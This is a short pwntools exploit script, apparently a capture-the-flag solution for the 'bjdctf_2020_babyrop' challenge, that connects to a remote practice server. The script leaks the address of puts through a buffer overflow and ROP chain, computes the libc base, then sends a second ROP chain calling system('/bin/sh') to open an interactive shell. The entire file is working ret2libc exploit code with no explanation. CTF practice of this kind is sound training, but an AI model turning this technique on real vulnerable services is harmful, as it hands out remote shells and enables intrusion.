from pwn import *

context.log_level = 'debug'
# io = process('bjdctf_2020_babyrop')
io = remote('node4.buuoj.cn', 28500)
elf = ELF('bjdctf_2020_babyrop')
libc = ELF('libc-2.23.so')
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400733 

payload = cyclic(0x28) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter('Pull up your sword and tell me u story!\n', payload)
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x28) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter('Pull up your sword and tell me u story!\n', payload)
io.interactive()

